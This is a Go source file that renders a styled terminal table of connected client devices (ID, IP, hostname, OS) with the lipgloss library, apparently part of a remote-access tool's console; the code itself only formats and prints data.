package main

import (
	"fmt"

	"RATFF/shared"

	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/lipgloss/table"
)

const idColumnWidth = 20

var (
	headerStyle = lipgloss.NewStyle().
			Bold(true).
			Foreground(lipgloss.Color("#FFFFFF"))

	borderStyle = lipgloss.NewStyle().
			Foreground(lipgloss.Color("240"))

	evenRowStyle = lipgloss.NewStyle().
			Background(lipgloss.Color("#1A1A1A"))

	oddRowStyle = lipgloss.NewStyle().
			Background(lipgloss.Color("#222222"))
)

func PrintClientTable(clients []shared.ClientInfo) {
	if len(clients) == 0 {
		PrintInfo(T("no_device_connected"))
		return
	}

	PrintInfo(Tf("connected_devices", len(clients)))

	t := table.New().
		Headers(T("header_id"), T("header_ip"), T("header_hostname"), T("header_os")).
		Border(lipgloss.RoundedBorder()).
		BorderStyle(borderStyle).
		StyleFunc(func(row, col int) lipgloss.Style {
			// Header
			if row == table.HeaderRow {
				return headerStyle.
					Padding(0, 1).
					Align(lipgloss.Center)
			}

			// Zebra rows
			var s lipgloss.Style
			if row%2 == 0 {
				s = evenRowStyle
			} else {
				s = oddRowStyle
			}

			s = s.Padding(0, 1)

			switch col {
			case 0:
				// ID column: fixed width, no wrap
				s = s.
					Width(idColumnWidth).
					MaxWidth(idColumnWidth).
					Align(lipgloss.Left).
					Inline(true)
			case 1:
				s = s.Align(lipgloss.Center)
			default:
				s = s.Align(lipgloss.Left)
			}

			return s
		})

	for _, c := range clients {
		t.Row(
			formatID(c.ID),
			c.IP,
			c.Hostname,
			c.OSInfo,
		)
	}

	fmt.Println(t)
}

func formatID(id string) string {
	if lipgloss.Width(id) <= idColumnWidth {
		return id
	}

	// Keep the beginning and append "..."
	r := []rune(id)
	if len(r) <= idColumnWidth {
		return id
	}

	return string(r[:idColumnWidth-3]) + "..."
}
